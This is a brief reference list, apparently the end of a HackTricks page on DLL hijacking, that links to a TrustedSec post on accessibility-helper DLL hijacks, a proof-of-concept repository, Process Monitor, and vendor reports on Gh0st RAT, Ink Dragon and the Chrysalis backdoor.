- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Rapid7 – The Chrysalis Backdoor: A Deep Dive into Lotus Blossom’s toolkit](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)


{{#include ../../../banners/hacktricks-training.md}}
